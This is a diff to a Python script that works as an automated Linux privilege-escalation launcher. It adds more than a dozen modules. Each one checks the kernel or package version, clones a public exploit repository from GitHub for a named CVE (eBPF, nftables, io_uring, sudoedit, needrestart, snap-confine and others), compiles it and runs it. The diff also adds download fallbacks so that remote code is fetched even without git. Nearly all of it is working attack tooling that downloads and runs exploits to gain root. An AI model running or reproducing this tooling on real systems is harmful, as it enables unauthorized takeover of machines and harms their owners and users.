@@ -17,9 +17,11 @@ Usage:
 from __future__ import annotations
 
 import argparse
+import io
 import os
 import platform
 import re
+import tarfile
 try:
     import grp
     import pwd
@@ -34,6 +36,7 @@ import sys
 import tempfile
 import textwrap
 import time
+import urllib.request
 from dataclasses import dataclass, field
 
 # ---------------------------------------------------------------------------
@@ -132,16 +135,20 @@ def install_packages() -> bool:
     if shutil.which("apt-get"):
         plans.append(["sudo", "-n", "apt-get", "update"])
         plans.append(["sudo", "-n", "apt-get", "install", "-y",
-                      "gcc", "build-essential", "git", "curl", "tar", "make"])
+                      "gcc", "build-essential", "git", "curl", "tar", "make",
+                      "libmnl-dev", "libnftnl-dev", "liburing-dev", "libcap-dev"])
     elif shutil.which("dnf"):
         plans.append(["sudo", "-n", "dnf", "install", "-y",
-                      "gcc", "make", "git", "curl", "tar"])
+                      "gcc", "make", "git", "curl", "tar",
+                      "libmnl-devel", "libnftnl-devel", "liburing-devel", "libcap-devel"])
     elif shutil.which("yum"):
         plans.append(["sudo", "-n", "yum", "install", "-y",
-                      "gcc", "make", "git", "curl", "tar"])
+                      "gcc", "make", "git", "curl", "tar",
+                      "libmnl-devel", "libnftnl-devel", "liburing-devel", "libcap-devel"])
     elif shutil.which("apk"):
         plans.append(["sudo", "-n", "apk", "add", "--no-cache",
-                      "gcc", "musl-dev", "make", "git", "curl", "tar"])
+                      "gcc", "musl-dev", "make", "git", "curl", "tar",
+                      "libmnl-dev", "libnftnl-dev", "liburing-dev", "libcap-dev"])
     elif shutil.which("pacman"):
         plans.append(["sudo", "-n", "pacman", "-Sy", "--noconfirm",
                       "gcc", "make", "git", "curl", "tar"])
@@ -189,6 +196,66 @@ def ensure_tools() -> None:
 
 
 
+def git_clone(url: str, dest: str, cwd: str | None = None) -> int:
+    target = os.path.join(cwd or WORK, dest)
+    if have("git"):
+        try:
+            return subprocess.run(
+                ["git", "clone", "--depth", "1", url, target],
+                timeout=120,
+            ).returncode
+        except (OSError, subprocess.TimeoutExpired):
+            return 1
+
+    log(warn("      git missing; using tarball fallback"))
+    base = url.rstrip("/").removesuffix(".git")
+    for branch in ("main", "master"):
+        tar_url = f"{base}/archive/refs/heads/{branch}.tar.gz"
+        try:
+            data = urllib.request.urlopen(tar_url, timeout=60).read()
+        except Exception:
+            continue
+        try:
+            with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tf:
+                members = []
+                for member in tf.getmembers():
+                    parts = member.name.split("/", 1)
+                    if len(parts) < 2:
+                        continue
+                    member.name = parts[1]
+                    if not member.name or ".." in member.name.split("/"):
+                        continue
+                    members.append(member)
+                os.makedirs(target, exist_ok=True)
+                tf.extractall(target, members=members)
+            return 0
+        except Exception:
+            continue
+    return 1
+
+
+def download(url: str, dest: str, cwd: str | None = None) -> int:
+    target = os.path.join(cwd or WORK, dest)
+    if have("curl"):
+        try:
+            return subprocess.run(
+                ["curl", "-fsSL", url, "-o", target], timeout=120
+            ).returncode
+        except (OSError, subprocess.TimeoutExpired):
+            return 1
+    if have("wget"):
+        try:
+            return subprocess.run(["wget", "-qO", target, url], timeout=120).returncode
+        except (OSError, subprocess.TimeoutExpired):
+            return 1
+    try:
+        urllib.request.urlretrieve(url, target)
+        return 0
+    except Exception as exc:  # noqa: BLE001
+        log(bad(f"      download failed: {exc}"))
+        return 1
+
+
 def sh(cmd: str, desc: str = "", cwd: str | None = None,
        timeout: int | None = None) -> int:
     if desc:
@@ -196,6 +263,22 @@ def sh(cmd: str, desc: str = "", cwd: str | None = None,
     log(f"      $ {cmd}")
     if DRY:
         return 0
+
+    stripped = cmd.strip()
+    if stripped.startswith("git clone"):
+        parts = shlex.split(stripped)
+        args = [p for p in parts[2:] if p not in ("--depth", "1")
+                and not p.startswith("--depth=")]
+        if args:
+            url = args[0]
+            dest = (args[1] if len(args) > 1
+                    else os.path.basename(url.rstrip("/")).removesuffix(".git"))
+            return git_clone(url, dest, cwd)
+
+    if stripped.startswith("curl ") and not have("curl"):
+        match = re.search(r"curl\s+(?:-\S+\s+)*(\S+)\s+-o\s+(\S+)", stripped)
+        if match:
+            return download(match.group(1), match.group(2), cwd)
 
     def _run(command: str) -> int:
         try:
@@ -851,6 +934,202 @@ def m_2588():
     d = os.path.join(WORK, "cve2588")
     sh("make", "make", cwd=d)
     sh("./exp", "run", cwd=d)
+    return True
+
+
+@module("cve_2020_8835", "eBPF (CVE-2020-8835)", "kernel 5.4-5.6")
+def m_8835():
+    if not in_kernel_range((5, 4), (5, 6)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git"):
+        log(warn("      git missing"))
+        return False
+    sh("git clone --depth 1 https://github.com/snappyJack/Rick_write_exp_CVE-2020-8835.git cve8835", "clone")
+    d = os.path.join(WORK, "cve8835", "hijack_prctl", "exp")
+    if os.path.isdir(d):
+        if ensure_compiler():
+            sh(f"{CC} -o hijack_prctl hijack_prctl.c -lpthread", "compile", cwd=d)
+            sh("./hijack_prctl", "run", cwd=d)
+        elif os.access(os.path.join(d, "hijack_prctl"), os.X_OK):
+            sh("./hijack_prctl", "run prebuilt", cwd=d)
+    return True
+
+
+@module("cve_2022_1015", "nftables (CVE-2022-1015)", "kernel 5.12-5.16")
+def m_1015():
+    if not in_kernel_range((5, 12), (5, 16)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git"):
+        return False
+    sh("git clone --depth 1 https://github.com/pqlx/CVE-2022-1015.git cve1015", "clone")
+    d = os.path.join(WORK, "cve1015")
+    sh("make", "make (needs libmnl/libnftnl)", cwd=d)
+    sh("./pwn", "run", cwd=d)
+    return True
+
+
+@module("cve_2023_0179", "nftables (CVE-2023-0179)", "kernel 5.5-6.2")
+def m_0179():
+    if not in_kernel_range((5, 5), (6, 2)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git"):
+        return False
+    sh("git clone --depth 1 https://github.com/TurtleARM/CVE-2023-0179-PoC.git cve0179", "clone")
+    d = os.path.join(WORK, "cve0179")
+    sh("make needle", "make needle", cwd=d)
+    sh("./needle", "run", cwd=d)
+    return True
+
+
+@module("cve_2024_0582", "io_uring (CVE-2024-0582)", "kernel 6.4-6.7")
+def m_0582():
+    if not in_kernel_range((6, 4), (6, 7)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not ensure_compiler():
+        return False
+    sh("git clone --depth 1 https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582.git cve0582", "clone")
+    d = os.path.join(WORK, "cve0582")
+    sh(f"{CC} -O2 -o exploit exploit.c -luring", "compile", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2023_22809", "sudoedit (CVE-2023-22809)", "sudo 1.8.0-1.9.12p1")
+def m_22809():
+    version = capture("sudo -V 2>/dev/null | head -1")
+    log(f"      {version or 'sudo unknown'}")
+    if not have("git") or not version:
+        return False
+    sh("git clone --depth 1 https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc.git cve22809", "clone")
+    d = os.path.join(WORK, "cve22809")
+    sh("chmod +x exploit.sh; bash exploit.sh", "run", cwd=d)
+    return True
+
+
+@module("cve_2024_48990", "needrestart (CVE-2024-48990)", "needrestart installed")
+def m_48990():
+    if "needrestart" not in capture("dpkg -l 2>/dev/null | grep -i needrestart", timeout=15):
+        log(warn("      needrestart not installed"))
+        return False
+    if not have("git"):
+        return False
+    sh("git clone --depth 1 https://github.com/makuga01/CVE-2024-48990-PoC.git cve48990", "clone")
+    d = os.path.join(WORK, "cve48990")
+    sh("chmod +x start.sh; ./start.sh", "run", cwd=d)
+    return True
+
+
+@module("cve_2021_44731", "snap-confine (CVE-2021-44731)", "snap-confine SUID")
+def m_44731():
+    if not shutil.which("snap-confine") and not os.path.exists("/usr/lib/snapd/snap-confine"):
+        log(warn("      snap-confine not found"))
+        return False
+    if not have("git"):
+        return False
+    sh("git clone --depth 1 https://github.com/deeexcee-io/CVE-2021-44731-snap-confine-SUID.git cve44731", "clone")
+    d = os.path.join(WORK, "cve44731")
+    sh("chmod +x snap_confine_LPE.sh; bash snap_confine_LPE.sh", "run", cwd=d)
+    return True
+
+
+@module("cve_2023_32233", "nftables (CVE-2023-32233)", "kernel 6.0-6.3")
+def m_32233():
+    if not in_kernel_range((6, 0), (6, 3)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not ensure_compiler():
+        return False
+    sh("git clone --depth 1 https://github.com/Liuk3r/CVE-2023-32233.git cve32233", "clone")
+    d = os.path.join(WORK, "cve32233")
+    sh(f"{CC} -Wall -o exploit exploit.c -lmnl -lnftnl", "compile", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2022_0995", "watch_queue (CVE-2022-0995)", "kernel 5.8-5.16")
+def m_0995():
+    if not in_kernel_range((5, 8), (5, 16)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/Bonfee/CVE-2022-0995.git cve0995", "clone")
+    d = os.path.join(WORK, "cve0995")
+    sh("make", "make", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2022_25636", "nftables (CVE-2022-25636)", "kernel 5.4-5.16")
+def m_25636():
+    if not in_kernel_range((5, 4), (5, 16)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/Bonfee/CVE-2022-25636.git cve25636", "clone")
+    d = os.path.join(WORK, "cve25636")
+    sh("make", "make", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2022_27666", "ESP (CVE-2022-27666)", "kernel 5.4-5.16")
+def m_27666():
+    if not in_kernel_range((5, 4), (5, 16)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git"):
+        return False
+    sh("git clone --depth 1 https://github.com/plummm/CVE-2022-27666.git cve27666", "clone")
+    d = os.path.join(WORK, "cve27666")
+    sh("chmod +x compile.sh run.sh; ./compile.sh", "compile", cwd=d)
+    sh("./run.sh", "run", cwd=d)
+    return True
+
+
+@module("cve_2021_4204", "eBPF (CVE-2021-4204)", "kernel 5.4-5.15")
+def m_4204():
+    if not in_kernel_range((5, 4), (5, 15)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git"):
+        return False
+    sh("git clone --depth 1 https://github.com/tr3ee/CVE-2021-4204.git cve4204", "clone")
+    d = os.path.join(WORK, "cve4204")
+    sh("chmod +x build_and_run.sh; sh build_and_run.sh", "run", cwd=d)
+    return True
+
+
+@module("cve_2022_23222", "eBPF (CVE-2022-23222)", "kernel 5.8-5.16")
+def m_23222():
+    if not in_kernel_range((5, 8), (5, 16)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/tr3ee/CVE-2022-23222.git cve23222", "clone")
+    d = os.path.join(WORK, "cve23222")
+    sh("make", "make", cwd=d)
+    sh("./exploit", "run", cwd=d)
+    return True
+
+
+@module("cve_2021_3490", "eBPF (CVE-2021-3490)", "kernel 5.8-5.11")
+def m_3490():
+    if not in_kernel_range((5, 8), (5, 11)):
+        log(warn(f"      kernel {platform.release()} outside range"))
+        return False
+    if not have("git") or not have("make"):
+        return False
+    sh("git clone --depth 1 https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490.git cve3490", "clone")
+    d = os.path.join(WORK, "cve3490")
+    sh("make groovy || make hirsute", "make", cwd=d)
+    sh("bin/exploit.bin", "run", cwd=d)
     return True
 
 
